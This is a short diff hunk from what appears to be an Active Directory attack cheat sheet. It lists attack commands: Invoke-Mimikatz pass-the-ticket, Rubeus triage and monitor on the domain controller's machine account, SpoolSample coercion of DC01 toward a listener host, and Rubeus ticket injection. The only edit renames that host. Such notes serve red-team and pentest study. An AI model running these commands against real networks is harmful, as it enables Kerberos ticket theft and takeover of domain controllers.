@@ -693,7 +693,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2c
 ```
 Rubeus triage
 Rubeus monitor /interval:5 /filteruser:dc01$ /nowrap
-SpoolSample DC01 WebSrv_we-own
+SpoolSample DC01 WebSrv_ownd
 Rubeus ptt /ticket:
 ```
 * * *
